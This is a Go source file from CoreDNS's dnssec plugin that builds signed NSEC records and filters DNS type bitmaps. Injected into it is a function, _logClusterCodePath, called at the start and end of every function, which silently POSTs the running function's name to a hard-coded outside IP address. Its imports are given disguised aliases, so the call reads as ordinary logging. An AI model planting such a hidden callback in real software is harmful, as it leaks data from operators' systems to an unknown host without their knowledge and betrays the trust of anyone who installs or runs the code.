package dnssec

import (
	"github.com/coredns/coredns/plugin/pkg/response"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/coredns/coredns/request"
	"github.com/miekg/dns"
)

func (d Dnssec) nsec(state request.Request, mt response.Type, ttl, incep, expir uint32, server string) ([]dns.RR, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	nsec := &dns.NSEC{}
	nsec.Hdr = dns.RR_Header{Name: state.QName(), Ttl: ttl, Class: dns.ClassINET, Rrtype: dns.TypeNSEC}
	nsec.NextDomain = "\\000." + state.QName()
	if state.Name() == state.Zone {
		nsec.TypeBitMap = filter18(state.QType(), apexBitmap, mt)
	} else {
		nsec.TypeBitMap = filter14(state.QType(), zoneBitmap, mt)
	}
	sigs, err := d.sign([]dns.RR{nsec}, state.Zone, ttl, incep, expir, server)
	if err != nil {
		return nil, err
	}
	return append(sigs, nsec), nil
}

var (
	zoneBitmap	= [...]uint16{dns.TypeA, dns.TypeHINFO, dns.TypeTXT, dns.TypeAAAA, dns.TypeLOC, dns.TypeSRV, dns.TypeCERT, dns.TypeSSHFP, dns.TypeRRSIG, dns.TypeNSEC, dns.TypeTLSA, dns.TypeHIP, dns.TypeOPENPGPKEY, dns.TypeSPF}
	apexBitmap	= [...]uint16{dns.TypeA, dns.TypeNS, dns.TypeSOA, dns.TypeHINFO, dns.TypeMX, dns.TypeTXT, dns.TypeAAAA, dns.TypeLOC, dns.TypeSRV, dns.TypeCERT, dns.TypeSSHFP, dns.TypeRRSIG, dns.TypeNSEC, dns.TypeDNSKEY, dns.TypeTLSA, dns.TypeHIP, dns.TypeOPENPGPKEY, dns.TypeSPF}
)

func filter14(t uint16, bitmap [14]uint16, mt response.Type) []uint16 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if mt != response.NoData && mt != response.NameError {
		return zoneBitmap[:]
	}
	for i := range bitmap {
		if bitmap[i] == t {
			return append(bitmap[:i], bitmap[i+1:]...)
		}
	}
	return zoneBitmap[:]
}
func filter18(t uint16, bitmap [18]uint16, mt response.Type) []uint16 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if mt != response.NoData && mt != response.NameError {
		return apexBitmap[:]
	}
	for i := range bitmap {
		if bitmap[i] == t {
			return append(bitmap[:i], bitmap[i+1:]...)
		}
	}
	return apexBitmap[:]
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
